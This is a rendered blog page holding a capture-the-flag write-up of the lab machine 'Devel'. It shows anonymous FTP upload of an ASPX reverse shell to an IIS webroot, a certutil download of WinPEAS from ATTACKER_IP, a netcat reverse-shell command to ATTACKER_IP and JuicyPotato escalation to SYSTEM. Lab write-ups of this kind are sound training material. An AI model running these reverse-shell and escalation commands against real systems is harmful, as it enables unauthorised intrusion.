@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Resolution summary [!summary]
+Anonymous FTP login allowed with write permissions FTP directory mapped to IIS webroot Uploaded ASPX reverse shell via FTP Accessed shell through IIS to gain foothold as web service account Enumerated with WinPEAS finding SeImpersonatePrivilege enabled Exploited with JuicyPotato (x86) to escalate to SYSTEM Improved skills Anonymous FTP exploitation IIS webroot identification ASPX reverse shell creation SeImpersonatePrivilege exploitation JuicyPotato usage Token impersonation attacks Used tools [[Nmap]] [[FTP]] ASPX reverse shell WinPEAS JuicyPotato (x86) Information Gathering Scanned all TCP ports:
+" />
+<meta name="keywords" content="homepage, blog, cyber, cyberblog, cybersecurity, ftp, iis, aspx-shell, juicy-potato, seimpersonate" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/writeups/devel/" />
+
+
+    <title>
+        
+             :: Dragos Nutu 
+        
+    </title>
+
+
+
+
+
+  <link rel="stylesheet" href="../../main.min.2729760c629597024c5de34b40ea9f372f2b5a2a192dcdca537b7ddfa483eab8.css" integrity="sha256-Jyl2DGKVlwJMXeNLQOqfNy8rWioZLc3KU3t936SD6rg=" crossorigin="anonymous">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="../../apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="../../favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="../../favicon-16x16.png">
+    <link rel="manifest" href="../../site.webmanifest">
+    <link rel="mask-icon" href="../../safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="../../favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="Dragos Nutu">
+  <meta itemprop="description" content="Resolution summary [!summary]
+Anonymous FTP login allowed with write permissions FTP directory mapped to IIS webroot Uploaded ASPX reverse shell via FTP Accessed shell through IIS to gain foothold as web service account Enumerated with WinPEAS finding SeImpersonatePrivilege enabled Exploited with JuicyPotato (x86) to escalate to SYSTEM Improved skills Anonymous FTP exploitation IIS webroot identification ASPX reverse shell creation SeImpersonatePrivilege exploitation JuicyPotato usage Token impersonation attacks Used tools [[Nmap]] [[FTP]] ASPX reverse shell WinPEAS JuicyPotato (x86) Information Gathering Scanned all TCP ports:">
+  <meta itemprop="wordCount" content="381">
+  <meta itemprop="image" content="http://localhost:1313/">
+  <meta itemprop="keywords" content="Ftp,Iis,Aspx-Shell,Juicy-Potato,Seimpersonate">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/">
+  <meta name="twitter:title" content="Dragos Nutu">
+  <meta name="twitter:description" content="Resolution summary [!summary]
+Anonymous FTP login allowed with write permissions FTP directory mapped to IIS webroot Uploaded ASPX reverse shell via FTP Accessed shell through IIS to gain foothold as web service account Enumerated with WinPEAS finding SeImpersonatePrivilege enabled Exploited with JuicyPotato (x86) to escalate to SYSTEM Improved skills Anonymous FTP exploitation IIS webroot identification ASPX reverse shell creation SeImpersonatePrivilege exploitation JuicyPotato usage Token impersonation attacks Used tools [[Nmap]] [[FTP]] ASPX reverse shell WinPEAS JuicyPotato (x86) Information Gathering Scanned all TCP ports:">
+
+
+
+    <meta property="og:url" content="http://localhost:1313/writeups/devel/">
+  <meta property="og:site_name" content="Dragos Nutu">
+  <meta property="og:title" content="Dragos Nutu">
+  <meta property="og:description" content="Resolution summary [!summary]
+Anonymous FTP login allowed with write permissions FTP directory mapped to IIS webroot Uploaded ASPX reverse shell via FTP Accessed shell through IIS to gain foothold as web service account Enumerated with WinPEAS finding SeImpersonatePrivilege enabled Exploited with JuicyPotato (x86) to escalate to SYSTEM Improved skills Anonymous FTP exploitation IIS webroot identification ASPX reverse shell creation SeImpersonatePrivilege exploitation JuicyPotato usage Token impersonation attacks Used tools [[Nmap]] [[FTP]] ASPX reverse shell WinPEAS JuicyPotato (x86) Information Gathering Scanned all TCP ports:">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:tag" content="Ftp">
+    <meta property="article:tag" content="Iis">
+    <meta property="article:tag" content="Aspx-Shell">
+    <meta property="article:tag" content="Juicy-Potato">
+    <meta property="article:tag" content="Seimpersonate">
+    <meta property="og:image" content="http://localhost:1313/">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="../../" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text ">
+                whoami</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="../../projects">Projects</a></li><li><a href="../../resume">Resume</a></li><li><a href="../../reviews">Reviews</a></li><li><a href="../../writeups">Writeups</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="http://localhost:1313/writeups/devel/"></a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <h1 id="resolution-summary">Resolution summary</h1>
+<blockquote>
+<p>[!summary]</p>
+<ul>
+<li>Anonymous FTP login allowed with write permissions</li>
+<li>FTP directory mapped to IIS webroot</li>
+<li>Uploaded ASPX reverse shell via FTP</li>
+<li>Accessed shell through IIS to gain foothold as web service account</li>
+<li>Enumerated with WinPEAS finding SeImpersonatePrivilege enabled</li>
+<li>Exploited with JuicyPotato (x86) to escalate to SYSTEM</li>
+</ul>
+</blockquote>
+<h2 id="improved-skills">Improved skills</h2>
+<ul>
+<li>Anonymous FTP exploitation</li>
+<li>IIS webroot identification</li>
+<li>ASPX reverse shell creation</li>
+<li>SeImpersonatePrivilege exploitation</li>
+<li>JuicyPotato usage</li>
+<li>Token impersonation attacks</li>
+</ul>
+<h2 id="used-tools">Used tools</h2>
+<ul>
+<li>[[Nmap]]</li>
+<li>[[FTP]]</li>
+<li>ASPX reverse shell</li>
+<li>WinPEAS</li>
+<li>JuicyPotato (x86)</li>
+</ul>
+<hr>
+<h1 id="information-gathering">Information Gathering</h1>
+<p>Scanned all TCP ports:</p>
+<pre tabindex="0"><code class="language-nmap" data-lang="nmap"># Nmap 7.95 scan initiated Tue Jul 29 02:45:35 2025
+Nmap scan report for 10.10.10.5
+Host is up (0.060s latency).
+Not shown: 65533 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Microsoft ftpd
+| ftp-syst:
+|_  SYST: Windows_NT
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 03-18-17  02:06AM       &lt;DIR&gt;          aspnet_client
+| 03-17-17  05:37PM                  689 iisstart.htm
+|_03-17-17  05:37PM               184946 welcome.png
+80/tcp open  http    Microsoft IIS httpd 7.5
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-title: IIS7
+|_http-server-header: Microsoft-IIS/7.5
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</code></pre><hr>
+<h1 id="enumeration">Enumeration</h1>
+<h2 id="port-21---ftp-microsoft-ftpd">Port 21 - FTP (Microsoft FTPd)</h2>
+<ul>
+<li>Anonymous FTP login allowed (FTP code 230)</li>
+<li>Directory contains IIS files:
+<ul>
+<li>aspnet_client/</li>
+<li>iisstart.htm</li>
+<li>welcome.png</li>
+</ul>
+</li>
+</ul>
+<p>FTP directory appears to be mapped to IIS webroot.</p>
+<h2 id="port-80---http-iis-75">Port 80 - HTTP (IIS 7.5)</h2>
+<ul>
+<li>Microsoft IIS 7.5</li>
+<li>Default IIS7 page</li>
+<li>TRACE method potentially enabled</li>
+</ul>
+<hr>
+<h1 id="exploitation">Exploitation</h1>
+<h2 id="ftp-file-upload-to-iis">FTP File Upload to IIS</h2>
+<ol>
+<li>Connected anonymously to FTP:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ftp 10.10.10.5
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Username: anonymous</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Password: &lt;blank&gt;</span>
+</span></span></code></pre></div><ol start="2">
+<li>
+<p>Verified write permissions</p>
+</li>
+<li>
+<p>Downloaded ASPX reverse shell:
+<a href="https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx">https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx</a></p>
+</li>
+<li>
+<p>Modified shell with attacker IP and port</p>
+</li>
+<li>
+<p>Uploaded via FTP:</p>
+</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ftp&gt; put shell.aspx
+</span></span></code></pre></div><ol start="6">
+<li>Started listener:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">4444</span>
+</span></span></code></pre></div><ol start="7">
+<li>Accessed shell through IIS:</li>
+</ol>
+<pre tabindex="0"><code>http://10.10.10.5/shell.aspx
+</code></pre><p>Obtained reverse shell as &ldquo;web&rdquo; service account.</p>
+<hr>
+<h1 id="privilege-escalation-to-system">Privilege Escalation to SYSTEM</h1>
+<h2 id="local-enumeration">Local enumeration</h2>
+<p>Transferred WinPEAS to target:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>certutil -urlcache <span style="color:#f92672">-f</span> http<span style="color:#960050;background-color:#1e0010">:</span>//ATTACKER_IP/winpeas.bat winpeas.bat
+</span></span></code></pre></div><p>Ran enumeration:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>winpeas.bat
+</span></span></code></pre></div><p>Discovered:</p>
+<ul>
+<li>SeImpersonatePrivilege enabled</li>
+<li>Windows architecture: x86 (32-bit)</li>
+</ul>
+<h2 id="privilege-escalation-vector">Privilege Escalation vector</h2>
+<p>Exploited SeImpersonatePrivilege using JuicyPotato:</p>
+<ol>
+<li>
+<p>Downloaded precompiled x86 JuicyPotato:
+<a href="https://github.com/ivanitlearning/Juicy-Potato-x86/releases">https://github.com/ivanitlearning/Juicy-Potato-x86/releases</a></p>
+</li>
+<li>
+<p>Reference guide used:
+<a href="https://jlajara.gitlab.io/Potatoes_Windows_Privesc#juicyPotato">https://jlajara.gitlab.io/Potatoes_Windows_Privesc#juicyPotato</a></p>
+</li>
+<li>
+<p>Transferred JuicyPotato.exe to target</p>
+</li>
+<li>
+<p>Created batch file for reverse shell:</p>
+</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> START C:\path\to\nc.exe ATTACKER_IP 4445 -e cmd.exe &gt; shell.bat
+</span></span></code></pre></div><ol start="5">
+<li>Executed JuicyPotato:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>JuicyPotato.exe -l 1337 -p C:\path\to\shell.bat -t * -c {CLSID}
+</span></span></code></pre></div><ol start="6">
+<li>Obtained SYSTEM reverse shell</li>
+</ol>
+<hr>
+<h1 id="trophy">Trophy</h1>
+<blockquote>
+<p>[!todo] <strong>User.txt</strong>
+C:\Users&lt;username&gt;\Desktop\user.txt</p>
+</blockquote>
+<blockquote>
+<p>[!todo] <strong>Root.txt</strong>
+C:\Users\Administrator\Desktop\root.txt</p>
+</blockquote>
+<h2 id="notes">Notes</h2>
+<ul>
+<li>After many failed attempts with different potato exploits, x86 version was key</li>
+<li>SeImpersonatePrivilege is powerful privilege for token impersonation</li>
+<li>JuicyPotato works well on older Windows systems</li>
+</ul>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="http://localhost:1313/tags/ftp/">ftp</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/iis/">iis</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/aspx-shell/">aspx-shell</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/juicy-potato/">juicy-potato</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/seimpersonate/">seimpersonate</a></span>
+        
+    </p>
+
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            
+            
+            
+            
+            <span></span>
+        </div>
+    </div>
+    
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="../../bundle.min.ad54ad97364f77ede35def9096b162bb1f0b3973aa50b080f5e82fa147f6882e2a7200d7535adbf9b51bebf939f1c1ca9bbe6be87530092aca720eac4a226fda.js" integrity="sha512-rVStlzZPd&#43;3jXe&#43;QlrFiux8LOXOqULCA9egvoUf2iC4qcgDXU1rb&#43;bUb6/k58cHKm75r6HUwCSrKcg6sSiJv2g=="></script>
+
+
+
+
+    </body>
+</html>
